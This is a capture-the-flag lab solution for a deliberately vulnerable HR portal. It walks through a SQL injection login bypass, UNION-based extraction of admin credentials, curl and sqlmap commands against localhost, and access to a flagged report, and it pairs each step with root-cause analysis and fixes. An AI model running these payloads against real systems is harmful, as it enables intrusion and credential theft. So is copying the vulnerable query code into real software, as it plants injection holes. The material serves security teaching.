# Lab 1 Solutions — MeridianHR Portal

Full exploitation walkthrough with payloads, root-cause analysis, and remediation guidance.

---

## Vulnerability Summary

| Layer | Endpoint | Type | Impact |
|---|---|---|---|
| 1 | `POST /api/auth/login` | SQL Injection — Classic | Authentication bypass as any employee |
| 2 | `GET /api/payslips?ref=` | SQL Injection — UNION-based extraction | Full database dump including admin credentials |
| 3 | `GET /api/admin/reports/HR-2026-003` | Broken access control (reached via extracted creds) | Read classified HR document containing the flag |

---

## Layer 1 — Authentication Bypass

### Vulnerable Code

`backend/server.js`, `POST /api/auth/login`:

```javascript
const query = `SELECT id, username, full_name, department, job_title, employee_id, role
               FROM employees
               WHERE username = '${username}' AND password = '${password}'`;
```

### Root Cause

The `username` and `password` values from the POST body are interpolated directly into the SQL string. No parameterisation is used. All SQL errors are caught and suppressed, so the injection is silent — but login success/failure still leaks whether a result row was returned.

### Exploitation

Inject a tautological condition into the `username` field and comment out the password check:

```
username: ' OR '1'='1' --
password: anything
```

Resulting SQL:

```sql
SELECT id, username, full_name, department, job_title, employee_id, role
FROM employees
WHERE username = '' OR '1'='1' --' AND password = 'anything'
```

The `OR '1'='1'` is always true. The `--` discards the rest. The database returns the first row (`john.taylor`). A session is established.

**curl:**
```bash
curl -c cookies.txt -s -X POST http://localhost:8081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' OR '\''1'\''='\''1'\'' --","password":"x"}'
# Response: {"success":true}
```

### Fix

Use a parameterised prepared statement:

```javascript
const employee = db.prepare(`
  SELECT id, username, full_name, department, job_title, employee_id, role
  FROM employees WHERE username = ? AND password = ?
`).get(username, passwordHash);   // also hash the password with bcrypt
```

Also store passwords as bcrypt hashes; never plaintext.

---

## Layer 2 — UNION-based Privilege Escalation

### Vulnerable Code

`backend/server.js`, `GET /api/payslips`:

```javascript
const query = `SELECT period,gross_salary,net_salary,deductions,issued_date
               FROM payslips WHERE employee_ref='${ref}' ORDER BY issued_date DESC`;
```

### Root Cause

The `ref` query parameter is inserted directly into the SQL string. The endpoint was added to allow HR staff to look up payslips by employee reference and was not reviewed against the same scrutiny as the login endpoint. Errors are suppressed; however, because retrieved rows are returned as JSON, UNION-based extraction is fully viable.

### Exploitation Steps

#### Step 1 — Confirm injection and determine column count

The SELECT returns 5 columns. Test with:

```
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
```

If the `payslips` array contains one entry with nulls, the column count is confirmed.

#### Step 2 — Enumerate tables via sqlite_master

```
' UNION SELECT name,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--
```

Returns table names: `employees`, `payslips`, `hr_reports`, `announcements`.

#### Step 3 — Extract admin credentials

```
' UNION SELECT username,password,role,employee_id,email FROM employees WHERE role='hr_admin'--
```

URL-encoded:
```
http://localhost:8081/api/payslips?ref=NONE%27%20UNION%20SELECT%20username%2Cpassword%2Crole%2Cemployee_id%2Cemail%20FROM%20employees%20WHERE%20role%3D%27hr_admin%27--
```

Response:
```json
{
  "payslips": [{
    "period":       "hr.admin",
    "gross_salary": "<randomly generated per container>",
    "net_salary":   "hr_admin",
    "deductions":   "MCG-00010",
    "issued_date":  "a.whitfield@meridian-consulting.internal"
  }]
}
```

> **Note:** The password is randomly generated each time the container is built. Copy the value from `gross_salary` above — that is the credential you will use in Layer 3.

Credentials: **hr.admin** / `<value from gross_salary field>`

**curl:**
```bash
curl -b cookies.txt -s \
  "http://localhost:8081/api/payslips?ref=NONE%27%20UNION%20SELECT%20username%2Cpassword%2Crole%2Cemployee_id%2Cemail%20FROM%20employees%20WHERE%20role%3D%27hr_admin%27--"
```

#### Full sqlmap alternative

sqlmap requires an authenticated session cookie (`connect.sid`). Obtain it first using one of these methods:

**Option A — curl (recommended):** Use the Layer 1 bypass to log in and save the cookie jar, then read the value:

```bash
# 1. Login via SQLi bypass; -c writes the Set-Cookie header to cookies.txt
curl -c cookies.txt -s -X POST http://localhost:8081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' OR '\''1'\''='\''1'\'' --","password":"x"}'
# Response: {"success":true}

# 2. Extract the connect.sid value from the cookie jar
grep connect.sid cookies.txt
# Example output:
# localhost  FALSE  /  FALSE  <expiry>  connect.sid  s%3AaBcDeFgH...
#                                                     ^^^^^^^^^^^^^^^^ this is your cookie value
```

**Option B — Browser DevTools:**
1. Log in at `http://localhost:8081/login` using the SQLi bypass payload
2. Open DevTools → **Application** tab → **Cookies** → `http://localhost:8081`
3. Copy the value of the `connect.sid` cookie

Then pass it to sqlmap:

```bash
sqlmap -u "http://localhost:8081/api/payslips?ref=MCG-00142" \
  --cookie="connect.sid=<YOUR_SESSION_COOKIE>" \
  -T employees --dump --level=3 --batch
```

### Fix

Use parameterised queries; validate the `ref` value against the authenticated user's own `employee_id`:

```javascript
// SECURE: only allow own records unless role is hr_admin
const safeRef = req.session.user.role === 'hr_admin' ? ref : req.session.user.employee_id;
const rows = db.prepare(`SELECT period,gross_salary,net_salary,deductions,issued_date
  FROM payslips WHERE employee_ref=? ORDER BY issued_date DESC`).all(safeRef);
```

---

## Layer 3 — Access Classified HR Report

### Path to the Flag

1. Return to `http://localhost:8081/login`
2. Log in with extracted credentials: **hr.admin** / `<password extracted from Layer 2 UNION query>`
3. Navigate to **HR Admin Panel** (sidebar link, visible only to `hr_admin` role)
4. In the Confidential HR Reports section, click **View** on:  
   `HR-2026-003 — Security Access Audit — HR Systems Q4 2025`
5. The flag is embedded in the report body under "Internal tracking reference:"

**curl shortcut:**
```bash
# Login as hr.admin — substitute the password extracted in Layer 2
curl -c admin.txt -s -X POST http://localhost:8081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"hr.admin","password":"<EXTRACTED_PASSWORD>"}'

# Retrieve the report
curl -b admin.txt -s http://localhost:8081/api/admin/reports/HR-2026-003 | python3 -m json.tool
```

---

## Full Attack Chain

```
Unauthenticated visitor
        │
        ▼  Layer 1 — Login SQLi bypass
        │  POST /api/auth/login
        │  username: ' OR '1'='1' --
        │
        ▼  Authenticated as john.taylor (employee)
        │
        ▼  Layer 2 — UNION injection on payslip endpoint
        │  GET /api/payslips?ref=NONE' UNION SELECT username,password,...
        │  FROM employees WHERE role='hr_admin'--
        │
        ▼  Credentials extracted: hr.admin / <random — read from gross_salary field>
        │
        ▼  Re-authenticate as hr.admin
        │
        ▼  Layer 3 — Admin panel → report viewer
        │  GET /api/admin/reports/HR-2026-003
        │
        ▼  FLAG obtained from report content
```

---

## Remediation Summary

| Issue | Fix |
|---|---|
| Login SQLi | Use `db.prepare(...).get(username, password)` — never interpolate |
| Payslip SQLi | Parameterise all query inputs; restrict `ref` to caller's own record |
| Plaintext passwords | Bcrypt hash with cost ≥12; compare with `bcrypt.compare()` |
| Excess data in payslip response | Strip columns not needed in the response; avoid SELECT * |
| Admin path discoverable | Role enforcement is correct on the API; additionally enforce on the DB layer with row-level security if switching to PostgreSQL |
